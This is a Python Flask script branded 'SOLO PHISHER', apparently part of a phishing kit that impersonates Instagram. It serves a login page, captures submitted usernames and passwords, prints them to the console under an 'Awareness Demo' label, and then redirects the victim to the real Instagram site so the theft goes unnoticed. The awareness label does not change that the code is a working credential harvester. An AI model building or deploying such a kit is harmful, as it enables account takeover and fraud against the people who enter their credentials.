from flask import Flask, render_template, request, send_from_directory, redirect
import os

app = Flask(__name__, static_folder='static', static_url_path='/assets')

# Banner
print(r"""

███████╗ ██████╗ ██╗      ██████╗     ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗
██╔════╝██╔═══██╗██║     ██╔═══██╗    ██╔═══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
███████╗██║   ██║██║     ██║   ██║    ██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
╚════██║██║   ██║██║     ██║   ██║    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
███████║╚██████╔╝███████╗╚██████╔╝    ██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝     ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

              By Neerj
""")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/demo', methods=['POST'])
def demo():

    username = request.form.get('username')
    password = request.form.get('password')

    print("\n===== Awareness Demo =====")
    print("Demo Username:", username)
    print("Demo Password:", password)
    print("==========================\n")

    return redirect('https://www.instagram.com/')

@app.route('/favicon.ico')
def favicon():
    return send_from_directory(os.path.join(app.root_path, 'static', 'img'),
                               'instagram.svg', mimetype='image/svg+xml')

if __name__ == '__main__':
    app.run(
        host='0.0.0.0',
        port=5000,
        debug=False,
        use_reloader=False
    )
